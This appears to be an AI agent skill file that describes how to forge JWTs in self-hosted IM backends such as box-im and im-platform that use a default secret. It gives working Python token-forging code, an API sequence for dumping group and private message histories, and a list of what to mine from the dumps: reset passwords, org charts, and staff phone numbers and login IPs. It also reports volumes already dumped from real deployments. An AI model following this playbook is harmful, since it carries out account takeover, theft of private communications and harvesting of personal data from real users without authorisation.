---
name: im-default-jwt-forgery
description: "Use when a self-hosted IM ships a default JWT secret."
version: 1.0.0
tags: [im, jwt, default-secret, box-im, im-platform, chat-dump, account-takeover]
---

# Self-hosted IM default-JWT forgery

Class: chat backends that mint their own HS256 tokens from a secret sitting in `application.yml` (box-im / im-platform and kin). The stock secret is copied between environments, so one leaked default = **any user, any shard**. Goal is operator/staff chat data, not a vuln list.

## When to Use

- Java `box-im` / `im-platform` source tree, Vue3+Vant or uni-app client, hash route `#/conversation/<gid>/chat`.
- API family `/api/user/self`, `/api/friend/list`, `/api/group/list`, `/api/message/group/loadOfflineMessage`.
- You hold the repo/`application.yml`, or a client bundle exposing `jwt.accessToken.secret`.
- A token you forged is rejected with 401 / `系统繁忙` — before blaming the secret, check the `info` claim.

Related (user-owned, may be richer for their own families): `im-chat-platform-pentest`, `chinese-private-im`.

## Forge

HS256. Payload must carry `aud` (userId **string**), `exp`, and **`info`** — a JSON **string** (not object) with `nickName/terminal/userId/userName`. Missing `info` fails even with the right secret.

```python
import jwt, json, time

def forge(secret, uid, nick="x"):
    info = json.dumps({"nickName": nick, "terminal": 1, "userId": uid, "userName": None},
                      ensure_ascii=False, separators=(',', ':'))
    return jwt.encode({"aud": str(uid), "exp": int(time.time()) + 86400, "info": info},
                      secret, algorithm="HS256")
```

Send `Authorization: Bearer <jwt>`; some builds also require a parallel `accessToken: <jwt>` header (bare Authorization → 400 is the tell).

## Sequence

1. `GET /api/user/self` — self-prove the uid (nickname, phone, last-login IP).
2. `GET /api/friend/list` / `GET /api/group/list` — group IDs, owners, member counts.
3. `POST /api/message/group/loadOfflineMessage` `{"groupId":<gid>,"minId":0}`; private equivalent `{"friendId":<uid>,"minId":0}`.
4. Fields must match the service DTO (`GroupMessageHistoryDTO` / `PrivateMessageHistoryDTO`); guessed shapes all answer `系统繁忙`. Read the impl first.
5. uid inventory: user-list JSON may be a **list** `[id, type, nickName, ?, chatNo, banned]`; `type==5` = operator/staff. Parsing as a dict silently gives `type==0`.
6. One forged staff uid can expose internal org groups plus full private traffic (observed 13.7MB / 40,554 msgs / 205 groups on a single uid; ten uids > 60MB).

## Front-end navigation

Vant conversation-item clicks are unreliable headed or headless. Set the hash directly to `#/conversation/<gid>/chat`; the `/chat` suffix is mandatory — without it the pane is blank and looks like a dead group.

## Mining priority

1. **Default reset password** announced in an internal group (“默认重置密码了 <pw>”) — best pivot word for the admin backend / RuoYi.
2. Org chart: internal group names, owner uid, member counts (宣导内部群 / 外招群 / 团队长群 / 核心骨干群 / 清算工作组).
3. Pay and recruitment terms, work-account vs life-account rules.
4. New domains, APKs, meeting links, finance-client landing pages.
5. Staff identity: nickname + phone + last-login IP (Dubai / Phnom Penh / UAE observed).

Regex starter: `(密码|口令|后台|管理|系统|搭建|源码|服务器|域名|https?://)` then read context manually.

## Pitfalls

- 401 / `系统繁忙` with a correct secret usually means missing/bad `info`, not a rotated key.
- `loadOfflineMessage` needs the exact DTO; do not brute field names.
- uid=1 may 500 as a data anomaly; try other live uids before concluding auth failure.
- Some deployments already rotated the default — verify with `/api/user/self` before scaling.
- Persist every response to disk; do not trust terminal stdout for multi-MB JSON.

## Files

- `references/box-im-jwt-dump.md` — full box-im/im-platform recipe: fingerprint, forge code, dump loop, observed volumes, mining regex, pitfalls.
